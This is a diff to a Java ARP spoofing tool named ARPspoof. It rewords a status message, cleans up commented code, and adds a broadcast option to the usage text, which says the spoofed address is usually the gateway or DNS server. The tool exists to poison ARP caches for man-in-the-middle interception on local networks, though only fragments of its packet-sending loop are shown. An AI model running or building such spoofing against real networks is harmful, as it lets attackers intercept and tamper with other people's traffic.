@@ -62,7 +62,7 @@ public class ARPspoof {
 		 
 		 
 		
-		System.out.println("Start spoofing on device number "+dev);
+		System.out.println("Spoofing ARP replies from "+usingIP+" to "+targetIP+"  on device  "+dev.name);
 		System.out.println("delay is  "+msec+" msec");
 		System.out.println("");
 		 sender = JpcapSender.openDevice(dev);
@@ -100,17 +100,10 @@ public class ARPspoof {
 			if (show) {
 				i++;
 				System.out.println(i+"  "+arp);
-				
 			}
 			
 			Thread.sleep(msec);
 		}
-		
-	//	capt.loopPacket(-1, new ARPspoof());
-	
-		
-		
-
 	}
 	
 	
@@ -118,8 +111,6 @@ public class ARPspoof {
 
 			sender.sendPacket(arp);	
 			
-
-	
 	}
 	
 	public static  NetworkInterface parseDev(String name) {
@@ -170,6 +161,7 @@ public class ARPspoof {
 
 		 System.out.println();
 		 System.out.println("      --dst	<ip> [ip that will receive spoofed packets]");
+		 System.out.println("		[--dst bcast]  make spoofed packets broadcasting");
 		 
 		 System.out.println();
 		 System.out.println("-s  --spoof	<ip> [ip that will be using for spoofing, most of all it is GATEWAY or DNS server] ");
@@ -182,11 +174,6 @@ public class ARPspoof {
 		 
 		 System.out.println();
 		 System.out.println("	 -t	<msec> [delay before each packet] (optional)");
-		 
-		 
-		 System.out.println();System.out.println();
-		 System.out.println("note: if you want send broadcast packet you can put 'bcast' in 's' parameter");
-		 System.out.println("      if you do that we will put ff:ff:ff:ff:ff:ff in target_hardaddr field");
 		
 			System.out.println();
 			System.out.println("created by Aleksandr Zhupanov");
